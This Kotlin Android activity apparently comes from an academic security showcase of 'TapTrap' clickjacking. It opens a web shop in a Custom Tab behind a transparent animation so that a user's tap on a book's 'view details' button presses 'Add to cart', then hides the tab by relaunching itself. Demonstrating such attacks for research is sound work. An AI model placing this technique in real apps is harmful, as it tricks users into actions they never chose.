package edu.hm.itsec.taptrapattackshowcase.clickjacking

import android.content.Intent
import android.os.Bundle
import android.os.CountDownTimer
import android.widget.Toast
import androidx.activity.OnBackPressedCallback
import androidx.appcompat.app.AppCompatActivity
import androidx.browser.customtabs.CustomTabsIntent
import androidx.core.net.toUri
import androidx.lifecycle.lifecycleScope
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import edu.hm.itsec.taptrapattackshowcase.R
import edu.hm.itsec.taptrapattackshowcase.databinding.ActivityBookSelectionBinding
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

/**
 * Activity to select a book and view its details.
 * The activity starts a CustomTab with a web shop to demonstrate clickjacking.
 * A tap on the "view details" button is a tap on the "Add to cart" button in the web shop.
 */
class BookSelectionActivity: AppCompatActivity() {

    private lateinit var binding: ActivityBookSelectionBinding

    private var transparencyDeactivated = false

    private var customTabOpened = false

    private lateinit var recyclerView: RecyclerView

    private var timer: CountDownTimer? = null

    private var addedProductToCart = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityBookSelectionBinding.inflate(layoutInflater)
        val view = binding.root
        setContentView(view)

        transparencyDeactivated = intent.getBooleanExtra("transparencyDeactivated", false)
        customTabOpened = intent.getBooleanExtra("customTabOpened", false)

        val bookList = listOf(
            Book(
                "The Lord of the Rings",
                "J.R.R. Tolkien",
                "Frodo Baggins sets out to destroy a powerful ring that threatens the world. His journey tests friendship, courage, and the strength of good against evil."
            ),
            Book(
                "Harry Potter I",
                "J.K. Rowling",
                "Harry discovers he is a wizard and begins his life at Hogwarts School of Witchcraft and Wizardry. There he uncovers a mystery involving a powerful magical stone."
            ),
            Book(
                "The Hunger Games",
                "Suzanne Collins",
                "Katniss Everdeen volunteers to take her sister’s place in a deadly televised competition. She must fight to survive in a brutal game controlled by a tyrannical regime."
            )
        )

        recyclerView = findViewById(R.id.recycler_view_book_selection)
        recyclerView.layoutManager = LinearLayoutManager(this)
        recyclerView.adapter = BookAdapter(bookList) { book ->
            val intent = Intent(applicationContext, BookDetailsActivity::class.java)
            intent.putExtra("transparencyDeactivated", transparencyDeactivated)
            intent.putExtra("addedProductToCart", addedProductToCart)
            intent.putExtra("selectedBookTitle", book.title)
            intent.putExtra("selectedBookAuthor", book.author)
            intent.putExtra("selectedBookSummary", book.summary)
            startActivity(intent)
            finish()
        }

        onBackPressedDispatcher.addCallback(this, object: OnBackPressedCallback(true) {
            override fun handleOnBackPressed() {
                // Start ClickjackingActivity with flags to prevent taking CustomTab from BackStack
                val clickjackingActivity = Intent(this@BookSelectionActivity, ClickjackingActivity::class.java)
                clickjackingActivity.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                startActivity(clickjackingActivity)
                finish()
            }
        })
    }

    override fun onPostResume() {
        super.onPostResume()

        if (!customTabOpened) {
            customTabOpened = true
            // Start CustomTab after short delay to make sure activity is rendered
            lifecycleScope.launch {
                delay(400)
                openCustomTab()
            }
        }
    }

    /**
     * Called, when the user is redirected to the app from the web shop.
     */
    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        setIntent(intent)
        val data = intent.data
        if (data?.scheme == "myapp" && data.host == "clickjacking-first-success-button-one") {
            timer?.cancel()
            addedProductToCart = true
            clickBookAt(0)
            finish()
        }
        if (data?.scheme == "myapp" && data.host == "clickjacking-first-success-button-two") {
            timer?.cancel()
            addedProductToCart = true
            clickBookAt(1)
            finish()
        }
        if (data?.scheme == "myapp" && data.host == "clickjacking-first-success-button-three") {
            timer?.cancel()
            addedProductToCart = true
            clickBookAt(2)
            finish()
        }
    }

    /**
     * Starts CustomTab with web shop (/shop page) and hides it by a custom animation.
     * The activity is restarted after 6 seconds to hide CustomTab.
     */
    private fun openCustomTab() {
        // Create an Intent to open the CustomTabs activity
        val url = ""  // URL of demo website
        var fadeInAnimation = R.anim.fade_in_clickjacking_transparent
        if (transparencyDeactivated) {
            fadeInAnimation = R.anim.fade_in_clickjacking
        }
        val customTabsIntent = CustomTabsIntent.Builder()
            .setShowTitle(false)
            .setUrlBarHidingEnabled(true)
            .setStartAnimations(
                this,
                fadeInAnimation,
                R.anim.fade_out
            )
            .build()

        customTabsIntent.launchUrl(this, "$url/shop".toUri())

        // Relaunch activity after 6 seconds to hide CustomTab
        timer = object : CountDownTimer(6000, 1000) {
            override fun onTick(millisUntilFinished: Long) {}

            override fun onFinish() {
                val bookSelectionActivityIntent = Intent(
                    this@BookSelectionActivity,
                    BookSelectionActivity::class.java
                )
                bookSelectionActivityIntent.putExtra("customTabOpened", customTabOpened)
                bookSelectionActivityIntent.putExtra("transparencyDeactivated", transparencyDeactivated)
                val toast = Toast(applicationContext)
                toast.setText("Restarting...")
                toast.show()
                startActivity(bookSelectionActivityIntent)
                finish()
            }
        }.start()
    }

    /**
     * Clicks "view details" button of the book at a specific position.
     */
    private fun clickBookAt(position: Int) {
        val holder = recyclerView.findViewHolderForAdapterPosition(position)
                as? BookAdapter.BookViewHolder ?: return
        holder.button?.performClick()
    }
}